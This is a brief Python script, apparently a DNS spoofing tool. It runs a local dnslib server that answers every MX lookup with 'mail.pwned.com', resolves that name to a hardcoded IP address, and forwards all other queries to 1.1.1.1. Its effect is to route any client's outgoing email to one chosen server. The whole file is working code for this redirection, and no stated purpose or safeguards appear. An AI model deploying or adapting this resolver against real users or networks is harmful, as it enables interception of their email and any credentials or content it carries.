from dnslib import RR
from dnslib.server import DNSServer, DNSRecord, RCODE
import socket
from time import sleep

DEST_SERVER = '207.148.127.201'

class Resolver:
    def resolve(self, request, handler):
        reply = request.reply()
        if request.q.qtype == 15:
            mxrr = RR.fromZone("{} IN MX 10 {}".format(request.q.qname, 'mail.pwned.com'))
            reply.add_answer(*mxrr)
        elif request.q.qtype == 1 and request.q.qname == 'mail.pwned.com':
               arr = RR.fromZone("{} IN A {}".format('mail.pwned.com', DEST_SERVER))
               reply.add_answer(*arr)
        else:
            try:
                if handler.protocol == 'udp':
                    proxy_r = request.send('1.1.1.1', 53,
                                    timeout=10)
                else:
                    proxy_r = request.send('1.1.1.1', 53,
                                    tcp=True,timeout=10)
                reply = DNSRecord.parse(proxy_r)
            except socket.timeout:
                reply.header.rcode = getattr(RCODE,'NXDOMAIN')
        return reply


resolver = Resolver()
servers = [
    DNSServer(resolver, port=5053, address='localhost', tcp=True),
    DNSServer(resolver, port=5053, address='localhost', tcp=False),
]

if __name__ == '__main__':
    for s in servers:
        s.start_thread()

    try:
        while 1:
            sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.stop()
